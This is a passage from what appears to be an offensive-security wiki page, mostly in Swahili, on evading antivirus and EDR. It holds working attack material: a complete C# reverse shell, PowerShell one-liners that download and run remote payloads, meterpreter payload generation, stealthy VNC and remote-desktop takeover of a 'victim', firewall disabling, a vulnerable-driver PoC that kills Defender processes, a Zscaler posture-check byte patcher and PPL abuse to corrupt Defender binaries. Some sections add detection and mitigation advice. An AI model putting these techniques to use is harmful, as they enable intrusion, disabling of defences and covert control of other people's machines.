4.  Manual clean-up – endesha binary inayotokana nayo chini ya dnSpy, tafuta Base64 blobs kubwa au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload *halisi*. Mara nyingi malware huihifadhi kama byte array iliyosimbwa kwa TLV na kuinitialise ndani ya `<Module>.byte_0`.

Chain iliyo hapo juu hurejesha execution flow **bila kuhitaji kuendesha malicious sample** – jambo linalofaa unapofanyia kazi kwenye offline workstation.

> 🛈  ConfuserEx hutengeneza custom attribute inayoitwa `ConfusedByAttribute`, ambayo inaweza kutumika kama IOC kwa ajili ya kufanya triage ya samples kiotomatiki.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la project hii ni kutoa fork ya open-source ya [LLVM](http://www.llvm.org/) compilation suite inayoweza kutoa usalama ulioongezeka wa software kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia tampering.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuzalisha, wakati wa compilation, code iliyofichwa bila kutumia external tool yoyote na bila kubadilisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Huongeza layer ya operations zilizofichwa zinazozalishwa na C++ template metaprogramming framework, ambayo itafanya maisha ya mtu anayetaka ku-crack application kuwa magumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha pe files mbalimbali zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni metamorphic code engine rahisi kwa arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa lugha zinazoungwa mkono na LLVM, ikitumia ROP (return-oriented programming). ROPfuscator huficha program katika kiwango cha assembly code kwa kubadilisha instructions za kawaida kuwa ROP chains, na hivyo kuzuia dhana yetu ya kawaida ya control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipakia

## SmartScreen & MoTW

Huenda umewahi kuona screen hii unapodownload baadhi ya executables kutoka internet na kuzitekeleza.

Microsoft Defender SmartScreen ni security mechanism inayolenga kumlinda end user dhidi ya kuendesha applications ambazo huenda ni malicious.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hufanya kazi hasa kwa kutumia reputation-based approach, ikimaanisha kwamba applications ambazo hazidownloadwi mara kwa mara zita-trigger SmartScreen, hivyo kumtahadharisha na kumzuia end user kutekeleza file (ingawa file bado inaweza kutekelezwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina la Zone.Identifier ambayo huundwa automatically wakati wa kudownload files kutoka internet, pamoja na URL ambayo ilidownloadiwa kutoka kwake.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS ya file lililodownloadiwa kutoka internet.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizosainiwa kwa **trusted** signing certificate **hazita-trigger SmartScreen**.

Njia yenye ufanisi mkubwa ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumiwa kwenye volumes **zisizo za NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni tool inayopakia payloads ndani ya output containers ili kukwepa Mark-of-the-Web.

Mfano wa matumizi:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hii ni demo ya kubypass SmartScreen kwa kufungasha payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni utaratibu wenye nguvu wa logging katika Windows unaowezesha applications na system components **kuandika events**. Hata hivyo, unaweza pia kutumiwa na security products kufuatilia na kugundua shughuli hasidi.

Sawa na jinsi AMSI inavyoweza kuzimwa (kubypassiwa), inawezekana pia kufanya function ya **`EtwEventWrite`** ya user space process irudi mara moja bila kuandika events zozote. Hili hufanywa kwa kupatch function hiyo kwenye memory ili irudi mara moja, na hivyo kuzima ETW logging kwa process hiyo.

Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) na [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Kupakia C# binaries kwenye memory kumejulikana kwa muda mrefu, na bado ni njia nzuri sana ya kuendesha post-exploitation tools zako bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutahitaji tu kuwa na wasiwasi kuhusu kupatch AMSI kwa process nzima.

C2 frameworks nyingi (sliver, Covenant, metasploit, CobaltStrike, Havoc, n.k.) tayari hutoa uwezo wa kuexecute C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuspawn process mpya ya sacrificial**, kuinject malicious code yako ya post-exploitation ndani ya process hiyo mpya, kuexecute malicious code yako, na kisha kuua process hiyo mpya inapokamilika. Hii ina faida na hasara zake. Faida ya fork and run method ni kwamba execution hufanyika **nje ya** process yetu ya Beacon implant. Hii inamaanisha kuwa ikiwa jambo fulani litaenda vibaya au kugunduliwa katika post-exploitation action yetu, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuendelea kuishi.** Hasara ni kwamba una **uwezekano mkubwa zaidi** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Inahusu kuinject malicious code ya post-exploitation **ndani ya process yake yenyewe**. Kwa njia hii, unaweza kuepuka kuunda process mpya na kuifanya iscanwe na AV, lakini hasara ni kwamba ikiwa jambo fulani litaenda vibaya wakati wa execution ya payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa sababu inaweza kucrash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa ungependa kusoma zaidi kuhusu C# Assembly loading, tafadhali soma article hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, tazama [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Kutumia Lugha Nyingine za Programming

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kuexecute malicious code kwa kutumia lugha nyingine kwa kuipa compromised machine access **kwenye interpreter environment iliyosakinishwa kwenye Attacker Controlled SMB share**.

Kwa kuruhusu access ya Interpreter Binaries na environment kwenye SMB share, unaweza **kuexecute arbitrary code katika lugha hizi ndani ya memory** ya compromised machine.

Repo inaonyesha kuwa: Defender bado hufanya scan ya scripts, lakini kwa kutumia Go, Java, PHP, n.k. tunakuwa na **unyumbufu zaidi wa kubypass static signatures**. Testing kwa reverse shell scripts zisizo-obfuscated na za random katika lugha hizi kumefaulu.

## TokenStomping

Token stomping hubadilisha access token ya security product kama vile EDR au AV. Kupunguza privileges za token kunaweza kuacha process ikiendelea kufanya kazi huku ikizuia kufanya privileged inspection au remediation actions.

Ili kuzuia hili, Windows inaweza **kuzuia external processes** kupata handles za tokens za security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Kutumia Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi ku-deploy Chrome Remote Desktop kwenye PC ya victim na kisha kuitumia kuitakeover na kudumisha persistence:<sup>[[35]](#references)</sup>
1. Download kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", kisha bofya MSI file ya Windows ili kudownload MSI file.
2. Run installer silently kwenye victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye Chrome Remote Desktop page na ubofye next. Wizard itakuomba uauthorize; bofya Authorize button ili kuendelea.
4. Execute command iliyotolewa pamoja na adjustments zinazohitajika: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parameter ya `--pin` huweka PIN bila kutumia GUI).


## Advanced Evasion

Evasion ni mada ngumu sana; wakati mwingine unapaswa kuzingatia sources nyingi tofauti za telemetry katika system moja tu, kwa hiyo haiwezekani kabisa kubaki bila kugunduliwa katika mature environments.

Kila environment unayolenga itakuwa na strengths na weaknesses zake.

Ninakuhimiza sana uangalie talk hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata msingi wa kuelewa Advanced Evasion techniques zaidi.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hii pia ni talk nyingine nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Kuangalia ni sehemu zipi Defender inapata kuwa malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo **itaondoa sehemu za binary** hadi **igundue ni sehemu gani Defender** inapata kuwa malicious na kukutengezea sehemu hiyo.\
Tool nyingine inayofanya **jambo lilelile ni** [**avred**](https://github.com/dobin/avred), ikiwa na web offering ya huduma hiyo katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kusakinisha (kama administrator) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ifanye ianze mfumo unapoanzishwa na uiendeshe sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha telnet port** (stealth) **na uzime firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unahitaji upakuaji wa bin, si setup)

**ON THE HOST**: Tekeleza _**winvnc.exe**_ na usanidi server:

- Wezesha chaguo la _Disable TrayIcon_
- Weka password katika _VNC Password_
- Weka password katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili iliyoundwa **upya** _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

**attacker** anapaswa **kutekeleza ndani ya** **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kupokea **VNC connection** ya reverse. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha stealth, hupaswi kufanya mambo machache

- Usianzishe `winvnc` ikiwa tayari inaendeshwa, au utasababisha [popup](https://i.imgur.com/1SROTTl.png). Angalia ikiwa inaendeshwa kwa `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` katika directory hiyo hiyo, au itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usiendeshe `winvnc -h` kwa ajili ya help, au utasababisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **start lister** kwa `msfconsole -r file.rc` na **execute** **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Defender wa sasa atasitisha process haraka sana.**

### Ku-compile reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Revershell ya kwanza ya C#

I-compile kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Itumie pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kwa kutumia compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Tools nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuua AV/EDR Kutoka Kernel Space

Storm-2603 ilitumia console utility ndogo inayojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kupeleka ransomware. Tool hii huleta **driver wake mwenyewe aliye katika hali ya vulnerability lakini *signed*** na kumtumia vibaya kutekeleza shughuli za kernel zenye privilege ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.<sup>[[12]](#references)</sup>

Mambo muhimu ya kuchukua
1. **Signed driver**: Faili inayowasilishwa kwenye disk ni `ServiceMouse.sys`, lakini binary hiyo kwa kweli ni driver iliyosainiwa kihalali, `AToolsKrnl64.sys`, kutoka kwenye “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa kuwa driver huyo ana Microsoft signature halali, hupakiwa hata wakati Driver-Signature-Enforcement (DSE) imewezeshwa.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza husajili driver kama **kernel service**, na wa pili huianzisha ili `\\.\ServiceMouse` iweze kufikiwa kutoka user land.
3. **IOCTLs zinazowasilishwa na driver**
| IOCTL code | Uwezo                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Kusitisha process yoyote kwa kutumia PID (hutumiwa kuua huduma za Defender/EDR) |
| `0x990000D0` | Kufuta faili yoyote kwenye disk |
| `0x990001D0` | Ku-unload driver na kuondoa service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Kwa nini inafanya kazi**: BYOVD hupita ulinzi wa user-mode kabisa; code inayotekelezwa kwenye kernel inaweza kufungua process *zilizolindwa*, kuzikomesha, au kuchezea kernel objects bila kujali PPL/PP, ELAM au vipengele vingine vya hardening.

Detection / Mitigation
•  Wezesha Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
•  Fuatilia uundaji wa *kernel* services mpya na utoe alert driver anapopakiwa kutoka directory inayoweza kuandikwa na kila mtu au wakati hayupo kwenye allow-list.
•  Fuatilia handles za user-mode zinazoelekea kwenye custom device objects, zikifuatiwa na calls zenye mashaka za `DeviceIoControl`.

### Kupita Zscaler Client Connector Posture Checks kupitia On-Disk Binary Patching

**Client Connector** ya Zscaler hutumia sheria za device-posture locally na hutegemea Windows RPC kuwasilisha matokeo kwa components nyingine. Chaguo mbili dhaifu za design hufanya bypass kamili iwezekane:

1. Tathmini ya posture hufanyika **kabisa upande wa client** (boolean hutumwa kwa server).
2. Internal RPC endpoints huthibitisha tu kwamba executable inayounganisha **imesainiwa na Zscaler** (kupitia `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Kwa **kupatch binaries nne zilizosainiwa kwenye disk**, mechanisms zote mbili zinaweza kubatilishwa:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Daima hurudisha `1`, hivyo kila check huwa compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ process yoyote (hata ambayo haijasainiwa) inaweza ku-bind kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Inabadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Hupitishwa kwa short-circuit |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili za awali na kuanzisha upya service stack:

* **Ukaguzi wote** wa posture unaonyesha **green/compliant**.
* Binaries ambazo hazijasainiwa au zilizobadilishwa zinaweza kufungua named-pipe RPC endpoints (kwa mfano, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoathiriwa hupata access isiyo na vikwazo kwenye internal network iliyofafanuliwa na policies za Zscaler.

Case study hii inaonyesha jinsi maamuzi ya trust ya upande wa client pekee na signature checks rahisi yanaweza kushindwa kwa byte patches chache.

## Kutumia Protected Process Light (PPL) Kuharibu AV/EDR Kwa LOLBINs

Protected Process Light (PPL) hutekeleza signer/level hierarchy ili processes zilizo na protection level sawa au ya juu pekee ziweze kuingiliana na nyingine. Kwa upande wa offensive, ikiwa unaweza ku-launch kwa uhalali binary iliyowezeshwa PPL na kudhibiti arguments zake, unaweza kubadilisha functionality isiyo na madhara (kwa mfano, logging) kuwa constrained, PPL-backed write primitive dhidi ya protected directories zinazotumiwa na AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Kinachofanya process iendeshe kama PPL
- Target EXE (pamoja na DLLs zozote zilizopakiwa) lazima iwe imesainiwa kwa EKU inayoweza kutumia PPL.
- Process lazima iundwe kwa CreateProcess ikitumia flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Protection level inayooana lazima iombwe na ilingane na signer wa binary (kwa mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa anti-malware signers, `PROTECTION_LEVEL_WINDOWS` kwa Windows signers). Levels zisizo sahihi zitasababisha creation kushindwa.

Tazama pia utangulizi mpana kuhusu PP/PPL na LSASS protection hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (huchagua protection level na ku-forward arguments kwa target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Mfumo binary iliyosainiwa `C:\Windows\System32\ClipUp.exe` hujianzisha na hukubali parameter ya kuandika log file kwenye path iliyobainishwa na caller.
- Inapozinduliwa kama mchakato wa PPL, uandishi wa file hufanyika kwa backing ya PPL.
- ClipUp haiwezi kutafsiri paths zenye spaces; tumia 8.3 short paths kuelekeza kwenye maeneo yanayolindwa kwa kawaida.

8.3 short path helpers
- Orodhesha short names: `dir /x` katika kila parent directory.
- Pata short path katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Zindua LOLBIN yenye uwezo wa PPL (ClipUp) kwa `CREATE_PROTECTED_PROCESS` ukitumia launcher (kwa mfano, CreateProcessAsPPL).
2) Pitisha argument ya ClipUp ya log-path ili kulazimisha uundaji wa file katika protected AV directory (kwa mfano, Defender Platform). Tumia 8.3 short names inapohitajika.
3) Ikiwa target binary kwa kawaida huwa open/locked na AV inapokuwa ikifanya kazi (kwa mfano, MsMpEng.exe), panga uandishi ufanyike wakati wa boot kabla ya AV kuanza kwa kusakinisha auto-start service inayotekelezwa mapema kwa uhakika. Thibitisha mpangilio wa boot kwa Process Monitor (boot logging).
4) Baada ya reboot, uandishi unaoungwa mkono na PPL hufanyika kabla ya AV kufunga binaries zake, na hivyo kuharibu target file na kuzuia startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Maelezo na masharti
- Huwezi kudhibiti maudhui ambayo ClipUp huandika isipokuwa mahali yanapoandikwa; primitive hii inafaa kwa corruption badala ya precise content injection.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service na kuwa na reboot window.
- Timing ni muhimu: target haipaswi kuwa wazi; boot-time execution huepuka file locks.

Detections
- Process creation ya `ClipUp.exe` yenye arguments zisizo za kawaida, hasa ikiwa imeanzishwa na non-standard launchers, karibu na boot.
- Services mpya zilizosanidiwa kuji-start zenye suspicious binaries na zinazoanza mara kwa mara kabla ya Defender/AV. Chunguza service creation/modification kabla ya kushindwa kwa Defender startup.
- File integrity monitoring kwenye Defender binaries/Platform directories; file creations/modifications zisizotarajiwa kutoka kwa processes zilizo na protected-process flags.
- ETW/EDR telemetry: tafuta processes zilizoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya PPL level na non-AV binaries.

Mitigations
- WDAC/Code Integrity: zuia ni signed binaries zipi zinaweza kuendesha kama PPL na chini ya parents gani; zuia ClipUp invocation nje ya legitimate contexts.
- Service hygiene: zuia creation/modification ya auto-start services na monitor start-order manipulation.
